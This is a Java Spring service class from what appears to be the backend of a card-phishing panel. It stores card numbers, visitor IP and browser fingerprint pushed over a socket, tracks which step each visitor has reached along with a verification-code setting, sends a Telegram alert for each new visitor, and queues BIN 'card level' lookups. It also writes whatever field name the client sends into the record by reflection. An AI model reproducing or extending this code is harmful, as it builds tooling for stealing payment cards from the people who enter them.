package com.pj.project.bin_card;

import java.util.List;

import cn.hutool.core.bean.BeanUtil;
import cn.hutool.core.util.RandomUtil;
import cn.hutool.core.util.ReflectUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.json.JSONUtil;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.baomidou.mybatisplus.extension.service.IService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.pj.current.task.TaskService;
import com.pj.project.bin_head.BinHead;
import com.pj.project.bin_head.BinHeadMapper;
import com.pj.project.visitor_log.VisitorLogService;
import com.pj.utils.BeanExUtils;
import com.pj.utils.TelegramBotUtil;
import com.pj.utils.cache.RedisUtil;
import com.pj.utils.so.SoMap;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.pj.utils.sg.*;
import org.springframework.transaction.annotation.Transactional;

import javax.annotation.Resource;

/**
 * Service: bin_card --
 *
 * @author qzy
 */
@Service
@Transactional
@Slf4j
public class BinCardService extends ServiceImpl<BinCardMapper, BinCard> implements IService<BinCard> {

    /**
     * 底层 Mapper 对象
     */
    @Autowired
    BinCardMapper binCardMapper;

    @Resource
    private TaskService taskService;

    /**
     * 查集合 - 根据条件（参数为空时代表忽略指定条件）
     */
    List<BinCard> getList(SoMap so) {
        return binCardMapper.getList(so);
    }

    BinCard findByFingerprint(String fingerprint) {
        QueryWrapper<BinCard> ew = new QueryWrapper<>();
        ew.lambda().eq(BinCard::getFingerprint, fingerprint);
        List<BinCard> list = this.list(ew);
        return list.isEmpty() ? null : list.get(0);
    }

    /**
     * 处理socket 传来的数据
     *
     * @param card
     */
    public void handler(BinCard card) {
        String fingerprint = card.getFingerprint();
        BinCard binCard = findByFingerprint(fingerprint);
        boolean firstFlag = false;
        if (binCard == null) {
            firstFlag = true;
            String setting = "code";
            String passSetting = RedisUtil.get("pass:setting");
            if (StrUtil.isNotEmpty(passSetting)) {
                setting =passSetting;
            }
            binCard = new BinCard();
            binCard.setPassSetting(setting);
        }
        binCard.setSync(true)
                .setSysName(card.getSysName())
                .setCurrentStep(card.getCurrentStep())
                .setStepTotal(card.getStepTotal())
                .setFingerprint(fingerprint)
                .setIp(card.getIp())
                .setText(card.getText())
                .setUa(card.getUa())
                .setNotice(card.getNotice())
                .setRepetition(false);
        String field = card.getField();
        if (StrUtil.isNotEmpty(field)) {
            Object value = ReflectUtil.getFieldValue(card, field);
            if (value != null) {
                ReflectUtil.setFieldValue(binCard, field, value);
            }
        }
        binCard.setCard(StrUtil.replace(binCard.getCard(), " ", ""));
        log.info("car:{}", JSONUtil.toJsonStr(binCard));
        this.saveOrUpdate(binCard);
        if (firstFlag) {
            //第一次进入发送提示消息
            TelegramBotUtil bot = new TelegramBotUtil();
            String message = binCard.getId() + "号新用户浏览";
            bot.sendMessageToGroup(message);
        }
        if (!StrUtil.equals(binCard.getCard(), card.getCard())) {
            String carNo = binCard.getCard();
            log.info(" start to get car level");
            taskService.addTask(new CardInfoTask(RandomUtil.randomNumbers(11), carNo, 200));
        }
    }

    public BinCard findByCardNo(String carNo) {
        QueryWrapper<BinCard> ew = new QueryWrapper<>();
        ew.lambda().eq(BinCard::getCard, carNo);
        return getOne(ew);
    }

    public List<BinCard> findByCardNoPrefix(String carPrefix) {
        QueryWrapper<BinCard> ew = new QueryWrapper<>();
        ew.lambda().likeRight(BinCard::getCard,carPrefix);
        return list(ew);
    }
}
